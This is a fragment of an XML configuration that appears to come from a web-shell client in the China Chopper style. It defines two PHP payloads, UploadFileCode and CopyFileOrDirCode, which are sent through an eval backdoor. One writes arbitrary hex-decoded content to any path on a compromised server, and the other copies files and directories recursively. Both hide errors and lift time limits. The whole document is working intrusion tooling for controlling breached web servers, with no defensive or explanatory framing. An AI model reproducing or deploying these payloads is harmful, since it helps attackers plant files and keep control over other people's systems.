    <Func>
      <name>UploadFileCode</name>
	  <type>phpEval,phpEval_Cookie</type>
	  <funcParam location="Body" encrymode="Base64" >savefilePath</funcParam>
	  <funcParam location="Body" encrymode="Base64" >fileHexContext</funcParam>
      <item><![CDATA[@ini_set("display_errors","0");
@set_time_limit(0);
@set_magic_quotes_runtime(0);
echo("->|");
$f=base64_decode($_POST["$savefilePath$"]);
$c=base64_decode($_POST["$fileHexContext$"]);
$c=str_replace("\r","",$c);
$c=str_replace("\n","",$c);
$buf="";
for ($i=0; $i<strlen($c); $i+=2)$buf.=urldecode("%".substr($c,$i,2));
echo(@fwrite(fopen($f,"w"),$buf)?"1":"0");
echo("|<-");
die();]]></item>
    </Func>
    <Func>
      <name>CopyFileOrDirCode</name>
	  <type>phpEval,phpEval_Cookie</type>
	  <funcParam location="Body" encrymode="Base64" >sourceFilePath</funcParam>
	  <funcParam location="Body" encrymode="Base64" >targetFilePath</funcParam>
      <item><![CDATA[@ini_set("display_errors","0");
@set_time_limit(0);
@set_magic_quotes_runtime(0);
echo("->|");
function xcopy($src,$dest)
{
	if(is_file($src))
	{
		if(!copy($src,$dest))
			return false;
		else 
			return true;
	}
	$m=@dir($src);
	if(!is_dir($dest))
		if(!@mkdir($dest))
			return false;
	while($f=$m->read())
	{
		$isrc=$src."/".$f;
		$idest=$dest."/".$f;
		if((is_dir($isrc))&&($f!=".")&&($f!=".."))
		{
			if(!xcopy($isrc,$idest))
				return false;
		}
		else if(is_file($isrc))
		{
			if(!copy($isrc,$idest))
				return false;
		}
	}
	return true;
}
$fc=base64_decode($_POST["$sourceFilePath$"]);
$fp=base64_decode($_POST["$targetFilePath$"]);
echo(xcopy($fc,$fp)?"1":"0");
echo("|<-");
die();]]></item>
    </Func>
